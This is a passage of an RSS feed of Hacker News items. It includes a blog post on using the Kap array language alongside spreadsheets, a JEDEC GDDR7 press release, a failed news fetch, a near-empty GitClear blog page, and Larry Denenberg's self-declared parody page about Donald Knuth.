            <description><![CDATA[<p>URL: <a href="https://blog.dhsdevelopments.com/array-languages-vs">https://blog.dhsdevelopments.com/array-languages-vs</a>, See on <a href="https://news.ycombinator.com/item?id=39608822">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>It has been said that the most popular programming language in the world is the spreadsheet (and in particular these days, Excel).</p>

<p>There is a valid argument that the spreadsheet embodies an array programming model, making Excel the most popular array programming language in the world.</p>

<p>As the author of an array programming language based on the ideas of APL, I see the popularity of the spreadsheet as both a problem (because it's so error-prone) and an opportunity (because while the fans of imperative languages like Python are probably too set in their ways to consider an alternative model of computation, users of spreadsheets are already thinking in terms of matrices of values, and some of those users may be more open to the idea of performing the same computation in a more reliable way).</p>

<p>Before discussing how to leverage the power of spreadsheets with a proper array based programming language, there is a need to discuss how spreadsheets are used today, and some of the problems with them.</p>

<h2 id="the-different-uses-of-spreadsheets">The different uses of spreadsheets</h2>

<p>When people use a spreadsheet, it's to do one of several things. In short, spreadsheets are used to perform many different activities, which can roughly be grouped into 3 main categories:</p>
<ul><li>Data entry</li>
<li>Computation</li>
<li>Presentation</li></ul>

<h3 id="data-entry">Data entry</h3>

<p>Ever since VisiCalc was released in 1979, the spreadsheet has presented the user with a hugely inviting blank sheet of empty cells when the program was started.</p>

<table>
<thead>
<tr>
<th><img src="https://i.snap.as/yOXZFHEs.png" alt="Screenshot of the LibreOffice initial page"></th>
</tr>
</thead>

<tbody>
<tr>
<td><em>What do you want to calculate today?</em></td>
</tr>
</tbody>
</table>

<p>The page almost calls out to the user to start inputting numbers. Our innate desire to organise things in categories is what has made this design so successful. The VisiCalc initial screen looked like this, as does the latest version of LibreOffice some 45 years later.</p>

<p>All you have to do is to move the cursor to the cell you want to edit, type the values and things will just work. While data entry specialist is still a job title in use today, there was a time when <em>any</em> data input was a complicated process that required specialist knowledge. The spreadsheet changed this to allow anyone to record anything they wanted in digital form.</p>

<h3 id="computation">Computation</h3>

<p>Once the data is in the spreadsheet, you inevitably want to work with the numbers to produce some output.</p>

<p>Spreadsheets makes it very easy to take the step from simple data entry to computation of results. All you have to do is to add a <code>=sum(a1:a5)</code> to the sheet you'll have the sum in the cell you want.</p>

<h3 id="presentation">Presentation</h3>

<p>Spreadsheets aren't just about entering data and computing some results based on that data. It's also about presenting it in an appealing manner.</p>

<p>This is really where the you can see the genius of the invention. From something as simple as looking at a set of numbers, with the sum of those numbers neatly displayed as <strong>“Total:”</strong> below the values, to a complex form with coloured highlighting and different text styles to emphasise the results.</p>

<p>These sheets also become interactive without any extra work, since any change in the source data will automatically propagate to the sheet that contains the results.</p>

<h2 id="the-problems-with-spreadsheets-as-a-programming-environment">The problems with spreadsheets as a programming environment</h2>

<h3 id="the-spreadsheet-paradigm-hides-what-s-important-the-formulas-in-favour-of-the-superficial-the-data">The spreadsheet paradigm hides what's important (the formulas) in favour of the superficial (the data)</h3>

<p>Once you've taken that first step to compute a sum in a spreadsheet, it's not a very long road until you find yourself in one of those multi-sheet monsters most people who work in a large company have seen. I've certainly spent more time than I want to admit trying to untangle one of those bowls of spaghetti trying to find out why a certain number is computed the way it is.</p>

<p><img src="https://i.snap.as/qREaEZBm.png" alt="Screenshot of LibreOffice showing some products, its prices, amounts and the totals"></p>

<p>Here's a silly quiz: Can you spot the error in the above spreadsheet?</p>

<p>I don't think is possible to tell just by looking at the screenshot. The problem is that cell D5 has the actual value entered instead of a formula (this could have happened due to some simple copy&amp;paste error).</p>

<p>And this is the true danger of spreadsheets. These kinds of mistakes are completely invisible when they happen. Instead, the results start to deviate (probably slowly) once the input data start to change, and you could be looking at invalid numbers for quite some time before anyone notices the problem. And if the dataset is large, it may be a lot of work to actually find the underlying mistake.</p>

<p>And this bring us to my proposition: <strong>Spreadsheets are doing a great job at data entry and presentation, but it's severely lacking as a computation tool.</strong></p>

<p>However, very few tools allow you to have a seamless workflow using a proper language for computation while still using spreadsheets for the other aspects of the workflow. Once a spreadsheet has grown too large, someone decides to write a Python application to replicate it, which inevitably means that they have to build a webapp around it, which is probably going to be much less user-friendly since spreadsheets have had 40+ years of UI refinements, while the webapp was put together in an afternoon.</p>

<h3 id="spreadsheets-intentionally-hides-errors-in-an-attempt-to-do-what-the-user-thinks-they-want">Spreadsheets intentionally hides errors in an attempt to do what the user thinks they want</h3>

<p>Since this section could become very large if I listed all the examples where spreadsheets (and Excel in particular) fails to highlight problems, so here's a sample:</p>
<ul><li>Numbers tend to be floating point, which means that the moment a value is entered, there are precision issues. This is actually something that could be improved simply by supporting rational arithmetic, although I don't think there are any spreadsheets that do.</li>
<li>If a number is entered as a string, it will look identical to an actual number (except that the alignment will be different by default). If you're lucky, you'll get an error later which will manifest as an <a href="https://blog.dhsdevelopments.com/tag:ERR"><span>#</span><span>ERR</span></a> field, and then you'll have a fun time finding the source of that issue.</li>
<li>The system invites the user to write long single-line formulas in a language that is not suited for long, single-line formulas. It all ends up being crammed into a space that is nowhere near large enough to hold it. This makes editing the code an absolutely painful experience.</li>
<li>Various errors, such as exceeding limits tend to be ignored instead of invalidating the entire document. This is something the <a href="https://www.bbc.com/news/technology-54423988">UK government was made painfully aware of</a>.</li></ul>



<p>The <a href="https://kapdemo.dhsdevelopments.com/">Kap</a> programming language provides an alternative. Or rather, it's a work in progress so it's probably better to say it <em>aims</em> to provide an alternative. That said, I already use it for many tasks where a spreadsheet would be the go-to tool for many people.</p>

<p>Like most APL derivatives, the way you use it is often not by opening a test editor and start writing a program. Instead, you start it, you are presented with a prompt, and you start using it more as a calculator than a traditional programming language. This makes sense, since a large number of programming tasks that would take a lot of code in another language, can be solved in just a few characters in Kap.</p>

<p><img src="https://i.snap.as/ZnCmOdri.png" alt="Screenshot of the Kap welcome screen"></p>

<p>When given a problem to solve, you typically look at the problem and then reach for the tool that is the most efficient way to solve that problem, given tool availability and the person's preferences. For example:</p>
<ul><li>You need to compute the square of the number 54321. Most people would likely reach for their desktop environment's calculator here.</li>
<li>You want to compute the sum of some set of numbers. A natural choice here would be to use a spreadsheet.</li>
<li>You're given a dictionary and asked to find the longest word which contains no more than 2 vowels. I suspect a lot of people would open an editor and start writing Python code to solve this.</li></ul>

<p>For me, in all of these cases I open the Kap interactive tool, type a few characters and the problem is solved.</p>

<p>This is how I solved the third problem, by the way:</p>

<pre><code>{ ⊃ ⍵ ⊇⍨ ↑⍒≢¨ ⍵ /⍨ 2≥ (⊂"aeiou") (+/∊⍨)¨ ⍵ } io:read "dict.txt"
</code></pre>

<p>At this point, comments suggesting the code is “unreadable” are bound to be thrown around, but once you learn a handful of symbols, this is in fact significantly more readable than the kinds of formulas I see on a regular basis in Excel. This is proof that one is not more difficult to learn than the other, and that the problem is one of marketing rather than technological.</p>

<p>In case anyone is curious about the above code, the next blog post will be a breakdown of the code above to explain how it works. Check this blog in the coming days.</p>

<p>The point I am trying to make by showing this example at all is to try to evoke the same kind of response as beginners get when faced with any code of any kind.</p>

<h2 id="the-kap-approach-to-spreadsheet-integration">The Kap approach to spreadsheet integration</h2>

<h3 id="the-array-editor">The array editor</h3>

<p>The array editor is a graphical tool that allows the user to edit arrays in a way that is similar to a spreadsheet. The goal of this tool is to be as familiar as possible to someone who has used spreadsheets in the past.</p>

<p>The tool also allows you to type Kap expressions to manipulate values in the sheet. This is not like formulas, but rather direct modification of the data.</p>

<p>Funnily enough, this is actually something that is not obvious how to do in Excel. If you have a set of numbers, and you want to add some constant to them, the way you'd do that is to create a formula that adds the constant to a cell and put that into a different location, usually on the same sheet, and then paste that formula to all the cells in an area with the same size as the original data, and hope that you got the dimensions right.</p>

<p>The array editor allows you to easily edit the content of an array. Of course, you can always do it programmatically, but I think the prevalence of spreadsheets has shown that it's convenient to do it in a visual manner.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/ps9olHDleCA" title="YouTube video player" frameborder="0" allowfullscreen=""></iframe>

<h3 id="data-import">Data import</h3>

<p>I have been participating in discussion forums and chat channels about APL and other array languages for a while now, and when a beginner starts learning one of these languages, after they have gone through all the tutorials, there comes a time where they want to work with real data and the first question is: <em>How do I get my data into the system?</em></p>

<p>After all, that's what I asked myself and was frustrated when I realised that preparing the data was harder than actually working with it.</p>

<p>So, when I started working on my own implementation, one of the most important goals was that loading pre-existing data into the interpreter was one of the most important features.</p>

<p>What's the most common format of array-based data today? It's probably not very far fetched to assume it's Excel. For this reason, being able to read spreadsheets into Kap has been a priority, and at the time of writing the following methods are supported:</p>
<ul><li>Using functions such as <code>msoffice:read</code> function in the language itself. There are similar functions to load data in other formats, such as CSV and JSON.</li>
<li>Open the a spreadsheet file (Excel or LibreOffice) in the gui-based array editor.</li>
<li>Copy&amp;paste directly from the spreadsheet.</li></ul>

<p>By the way, you can also paste any table data into the array editor. Here's an example of using Wikipedia content:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/Dwm-KUms6I0" title="YouTube video player" frameborder="0" allowfullscreen=""></iframe>

<h3 id="presentation-1">Presentation</h3>

<p>This is the part of the Kap UI tool that needs to most work. The vision is to provide a user interface that makes it just as easy to create a presentation of results as it is in Excel. However, it would only be used for presentation purposes, and not for data entry nor computation.</p>

<p>While there is some actual code there that can be tested, it's still not usable except as a demonstration of what the current ideas in this direction are.</p>

<h2 id="the-goal-of-kap-is-to-be-a-complement-to-spreadsheets">The goal of Kap is to be a complement to spreadsheets</h2>

<p>When someone needs to compute something, they typically look at the problem and then decide to open a tool that helps them solve said problem. While Kap is a great tool to solve a variety of problems, I tend to believe that it particularly excels in the kinds of problems where the solution would otherwise involve a spreadsheet.</p>

<p>Kap is a fully open source project available under the MIT license. If you want to learn more about Kap, visit the <a href="https://kapdemo.dhsdevelopments.com/">Kap website</a>. Feedback is always welcome.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New Federal Rule Caps Credit Card Late Fees at $8 (212 pts)]]></title>
            <link>https://www.nytimes.com/2024/03/05/business/credit-card-late-fees.html</link>
            <guid>39608641</guid>
            <pubDate>Tue, 05 Mar 2024 20:13:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.nytimes.com/2024/03/05/business/credit-card-late-fees.html">https://www.nytimes.com/2024/03/05/business/credit-card-late-fees.html</a>, See on <a href="https://news.ycombinator.com/item?id=39608641">Hacker News</a></p>
Couldn't get https://www.nytimes.com/2024/03/05/business/credit-card-late-fees.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[JEDEC publishes GDDR7 graphics memory standard (144 pts)]]></title>
            <link>https://www.jedec.org/news/pressreleases/jedec-publishes-gddr7-graphics-memory-standard</link>
            <guid>39607753</guid>
            <pubDate>Tue, 05 Mar 2024 18:57:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jedec.org/news/pressreleases/jedec-publishes-gddr7-graphics-memory-standard">https://www.jedec.org/news/pressreleases/jedec-publishes-gddr7-graphics-memory-standard</a>, See on <a href="https://news.ycombinator.com/item?id=39607753">Hacker News</a></p>
<div id="readability-page-1" class="page"><div property="content:encoded"><p><b>ARLINGTON, Va., USA – MARCH 5, 2024</b> –<a href="https://www.jedec.org/">JEDEC Solid State Technology Association</a>, the global leader in the development of standards for the microelectronics industry, is pleased to announce the publication of JESD239 Graphics Double Data Rate (GDDR7) SGRAM.&nbsp; This groundbreaking new memory standard is available for free download from the <a href="https://www.jedec.org/standards-documents/docs/jesd239">JEDEC website</a>.&nbsp; JESD239 GDDR7 offers double the bandwidth over GDDR6, reaching up to 192 GB/s per device, and is poised to meet the escalating demand for more memory bandwidth in graphics, gaming, compute, networking and AI applications.</p>
<p>JESD239 GDDR7 is the first JEDEC standard DRAM to use the Pulse Amplitude Modulation (PAM) interface for high frequency operations.&nbsp; Its PAM3 interface improves the signal to noise ratio (SNR) for high frequency operation while enhancing energy efficiency. &nbsp;By using 3 levels (+1, 0, -1) to transmit 3 bits over 2-cycles versus the traditional NRZ (non-return-to-zero) interface transmitting 2 bits over 2-cycles, PAM3 offers higher data transmission rate per cycle resulting in improved performance.</p>
<p>Additional advanced features include:</p>
<ul>
<li>Core independent LFSR (linear-feedback shift register) training patterns with eye masking and error counters to improve training accuracy while reduce training time.</li>
<li>Doubles the number of independent channels doubles from 2 in GDDR6 to 4 in GDDR7.</li>
<li>Support for 16 Gbit to 32 Gbit densities including support for 2-Channel mode to double system capacity.</li>
<li><span><span>Address the market need for RAS (Reliability, Availability, Serviceability) by incorporating the latest data integrity features including on die ECC (ODECC) with real time reporting, data poison, Error check and Scrub, and command address parity with command blocking (CAPARBLK).</span></span></li>
</ul>
<p>“JESD239 GDDR7 marks a substantial advancement in high-speed memory design,” said Mian Quddus, JEDEC Board of Directors Chairman. “With the shift to PAM3 signaling, the memory industry has a new path to extend the performance of GDDR devices and drive the ongoing evolution of graphics and various high-performance applications.”</p>
<p>“GDDR7 is the first GDDR that not only focuses on bandwidth but addresses the market needs for RAS by incorporating the latest data integrity features that allow GDDR devices to better service existing markets such as Cloud gaming and compute and extend into new applications such as AI,” said Michael Litt, Chair of the JEDEC GDDR Subcommittee.</p>
<p><b>Industry Support</b></p>
<p>“The groundbreaking GDDR7 memory standard unveiled today represents a pivotal step towards unlocking the potential of next-generation consumer, gaming, commercial, and enterprise devices,” said Joe Macri, Compute and Graphics CTO and Corporate Fellow at <b>AMD</b>. "By harnessing the transformative power of GDDR7s, we can collectively unlock a new era of transformational compute and graphics possibilities, paving the way for a future shaped by innovation and discovery."</p>
<p>“<b>Micron</b> has a long-standing history of defining graphics DRAM standards with JEDEC and has played a critical role in driving GDDR7 standardization activities with our partners and customers,” said Frank Ross, lead architect and distinguished member of technical staff in Micron’s Compute and Networking Business Unit. “The development of GDDR products utilizing multi-level signaling has helped define a path to meet increasing future system bandwidth requirements. With the addition of leading RAS functionalities, the GDDR7 standard addresses workload requirements well beyond traditional graphics markets.”</p>
<p>“<b>NVIDIA</b> is excited that our work with JEDEC has helped to make PAM signaling the foundational technology for GDDR7, helping customers to get the most performance out of their GPU,” said Kaustubh Sanghani, VP GPU Product Management at NVIDIA.</p>
<p>“AI, HPC, and high-end gaming are demanding high-performance memory to process data at unprecedented speeds,” said YongCheol Bae, EVP, Head of Memory Product Planning, <b>Samsung</b>. “GDDR7 32Gbps will achieve 1.6x higher-performance with the highest reliability and cost-effectiveness.”</p>
<p>“With each successive generation of graphic memory, the industry always strives to achieve the ambitious goal of simultaneously securing the highest speed and improved power efficiency. <b>SK hynix</b> is proud to have participated in the GDDR7 standard work as a member of JEDEC, and is pleased to be able to provide customers with the memory with the highest speed and excellent power efficiency. Achieving the standard work once again will be a new opportunity for the industry to expand the memory ecosystem,” said Sang Kwon Lee, SK hynix VP of Product Planning.</p>
<p><b>About JEDEC</b><br>JEDEC is the global leader in the development of standards for the microelectronics industry. Thousands of volunteers representing over 350 member companies work together in more than 100 JEDEC committees and task groups to meet the needs of every segment of the industry, for manufacturers and consumers alike. The publications and standards generated by JEDEC committees are accepted throughout the world. All JEDEC standards are available for download from the JEDEC website. For more information, visit <a href="https://www.jedec.org/">https://www.jedec.org</a>.</p>
<p><b>Contact</b><br>Emily Desjardins<br><a href="mailto:emilyd@jedec.org"><span>emilyd@jedec.org</span></a><br>703-907-7560</p>
<p>###</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux Touchpad Like MacBook Update: 2023 Progress on Smooth Scrolling (247 pts)]]></title>
            <link>https://www.gitclear.com/blog/linux_touchpad_like_macbook_2023_update_smooth_scroll</link>
            <guid>39607747</guid>
            <pubDate>Tue, 05 Mar 2024 18:57:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.gitclear.com/blog/linux_touchpad_like_macbook_2023_update_smooth_scroll">https://www.gitclear.com/blog/linux_touchpad_like_macbook_2023_update_smooth_scroll</a>, See on <a href="https://news.ycombinator.com/item?id=39607747">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="main">

<div>
<ul>
<li>Engineering Clarity:</li>
<li>
<a href="https://www.gitclear.com/blog">All</a>
</li>
<li>
<a href="https://www.gitclear.com/blog?category_em=article">Articles</a>
</li>
<li>
<a href="https://www.gitclear.com/blog?category_em=news">News</a>
</li>
<li>
<a href="https://www.gitclear.com/blog?category_em=tip">Tips</a>
</li>
</ul>
</div>

<div>
<p><img data-retina="https://image.gitclear.com/1ei070fit02w3wm4eti78ww0scsd" src="https://image.gitclear.com/1ei070fit02w3wm4eti78ww0scsd">
</p>
</div>
<div>
<p><a href="https://www.gitclear.com/authors/1">Bill Harding</a>
<span title=" 6:51pm">
March  5, 2024
</span>
</p></div>

<div>
<div>
<div>
<p><a href="https://www.gitclear.com/authors/1"><img src="https://image.gitclear.com/0co0x8ol6om9sbuztyvm2ey4lwe4"></a>
</p>
<div>
<h3><a href="https://www.gitclear.com/authors/1">Bill Harding</a></h3>
<p>CEO/Programmer, GitClear</p>
</div>
</div>
<p>Bill is driven by the challenge of how best to quantify valuable questions that defy quantification. It's possible this instinct may have been awakened in Bill at age 14, when he won a soft, stuffed bunny at the orthodontist for guessing the number of jelly beans in the gumball machine.</p>
</div>

<div>
<h2>Comments</h2>
<p>No comments have been left on this blog.</p>

<p>Login to leave a comment</p>

</div>

</div>



</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[This Is Knuth 3:16 (2002) (130 pts)]]></title>
            <link>http://www.larry.denenberg.com/Knuth-3-16/</link>
            <guid>39607412</guid>
            <pubDate>Tue, 05 Mar 2024 18:30:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://www.larry.denenberg.com/Knuth-3-16/">http://www.larry.denenberg.com/Knuth-3-16/</a>, See on <a href="https://news.ycombinator.com/item?id=39607412">Hacker News</a></p>
<div id="readability-page-1" class="page">

<h2>This is Knuth 3:16</h2>

Welcome to Knuth 3:16, a commemoration of one of the great computer
scientists of ancient times, Donald Ervin Knuth.

<!-- This web page is a *PARODY*, a history of Knuth's life as it might be
written in the far future, when 2002 is a year in the very hazy past.
Please don't send me email telling me that Knuth is still alive!
-->

<p>

<table>
<caption>A rare surviving photograph of Don Knuth.</caption>
<tbody><tr><td>
<img src="http://www.larry.denenberg.com/Knuth-3-16/Images/rockne.jpg" alt="Coach Knuth Rockne"></td></tr></tbody></table>

<!-- The picture is of Knute Rockne -->


Knuth was probably born in the twentieth or early twentieth-first 
century.&nbsp; 

<!-- Knuth was born on January 10, 1938 -->


He had a primarily academic career, but unfortunately never held a position
at any present-day institution, so many details have been lost.&nbsp;

<!-- Knuth has been at Stanford since 1968 -->


His achievements were many.&nbsp; Some sources credit him with being the
original inventor of the computer, though this cannot be proved with any
accuracy.&nbsp; Certainly he made significant advances in several areas of
computer science and mathematics.

<!-- Need to mention Knuth's obvious ancestor King Knut somewhere! -->

</p><p>

But his accomplishments spanned other fields as well.&nbsp; As we shall
see, he was an artist of typeface and book design.&nbsp; He was also a
leading moralist and wrote commentaries on God and the Bible.&nbsp;

He was an enthusiastic musician, though exactly which was his instrument is
a subject of some dispute (the most likely candidates are the accordion,
jew's harp, and flugelhorn).&nbsp;

<!-- organ, really:  http://www-cs-faculty.stanford.edu/~knuth/organ.html -->

And many historians agree that, before becoming a mathematician and
computer scientist, he started life as a college football coach.&nbsp; He
was evidently highly respected in this field and was widely known by his
nickname "Knuth Rockne".&nbsp; In his declining years he returned
to this nickname as his interest and talents 
<a href="http://www.originalbirdart.com/knuth.htm">went to the birds</a>.

<!-- The link is to a page about wildlife artist Rockne Knuth, specialist
in bird art. -->

</p><p>

Here we celebrate Knuth using one of his own tricks:&nbsp; We examine the
sixteenth sentence (zero-based, of course) of the third chapter of each of
his surviving books.
</p><ul>
<li><a href="http://www.larry.denenberg.com/Knuth-3-16/taocp.html">The Art of Computer Programming</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/texbook.html">The TeXbook</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/visual-basic.html">Big Dummies Guide to Visual Basic</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/math-writing.html">Mathematical Writing</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/mariages-stables.html">Mariages Stables et leurs relations avec d'autres probl�ms combinatoires</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/surreal-numbers.html">Surreal Numbers</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/metafontbook.html">The METAFONTbook</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/story-of-o.html">The Story of O</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/concrete-math.html">Concrete Mathematics</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/data-structures.html">Data Structures and Their Algorithms</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/three-sixteen.html">3:16 Bible Texts Illuminated</a>
</li><li><a href="http://www.larry.denenberg.com/Knuth-3-16/mmixware.html">MMIXware:  A RISC Computer for the Third Millenium</a>
</li></ul>
<!--
<p>

New books will be added to this list as they are discovered.
-->

<p>
<a href="http://www.larry.denenberg.com/">This way to Larry's home page</a><br>
<small>Copyright © 20002 Larry Denenberg</small><br>

<!-- Not a typo.  Copyright 2002 Larry Denenberg -->

</p>



</div>]]></description>
        </item>
    </channel>
</rss>